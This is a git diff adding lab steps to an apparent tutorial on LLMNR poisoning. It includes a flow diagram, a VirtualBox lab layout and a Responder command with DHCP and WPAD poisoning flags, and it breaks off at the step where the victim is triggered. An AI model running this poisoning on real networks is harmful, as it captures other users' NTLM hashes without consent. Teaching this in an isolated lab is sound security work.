@@ -40,7 +40,7 @@ The problem is — any machine on the network can reply. So an attacker can say 
 
 ## How the Attack Works
 
-## LLMNR Poisoning Flow
+### LLMNR Poisoning Flow
 
 ```
 Victim                    Network                         Attacker
@@ -59,3 +59,61 @@ Victim                    Network                         Attacker
   |                          |                 Attacker captures
   |                          |                 NTLMv2 hash
 ```
+---
+
+## Lab Setup
+```
+| Machine |  OS        |      IP       |
+|---------|---------   |---------------|
+| Attacker| Kali Linux | 192.168.1.105 |
+| Victim  | Windows 10 | 192.168.1.110 |
+```
+
+Both machines on same VirtualBox Host-Only network.
+
+---
+
+## Attack Steps
+
+### Step 1 — Check Your IP
+
+```bash
+ip a
+```
+
+## Output:
+```
+eth0: 192.168.5.128
+```
+> Note: your interface name — mine was `eth0`
+
+---
+
+## Step 2 — Start Responder
+
+```bash
+sudo responder -I eth0 -dwv
+```
+```
+| Flag -----| Meaning---------- |
+|-----------|-------------------|
+| `-I eth0` | Network interface |
+|    `-d`   | DHCP poisoning    |
+|    `-w`   | WPAD proxy server |
+|    `-v`   | Verbose mode      |
+```
+---
+
+Responder will now listen on the network and wait for someone to broadcast a name request.
+
+---
+
+### Step 3 — Trigger from Victim Machine
+
+On Windows victim, open File Explorer and type:
+
+
+
+
+
+
